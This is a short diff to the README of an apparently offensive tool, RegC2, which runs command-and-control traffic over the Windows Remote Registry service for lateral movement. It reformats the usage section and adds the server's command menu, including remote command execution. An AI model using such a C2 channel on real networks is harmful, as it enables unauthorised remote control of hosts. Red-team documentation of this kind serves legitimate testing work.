@@ -15,16 +15,20 @@ The Remote Registry Service needs to be enabled on the server, and the user tryi
 **Limitations:** 
 Since the traffic is based on RPC, should only be suitable for lateral movement on local networks. 
 
-**Usage:**
-Server-side:
+### Usage:
+**Server-side:**
 ``` 
 RegC2Server.exe <Unique Registry key name to use>
-example: RegC2Server.exe dc01
+RegC2Server.exe dc01
+>help
+sleep 10         Set the sleep time to 10
+cmd whoami       Execute whoami
+exit             Exit the application gracefully
 ```
-Client-side:
+**Client-side:**
 ```
 RegC2Client.exe <host> <Registry name to use>
-example: RegC2Client.exe dc01 ws01
+RegC2Client.exe dc01 ws01
 ```
 
 **How it works:**
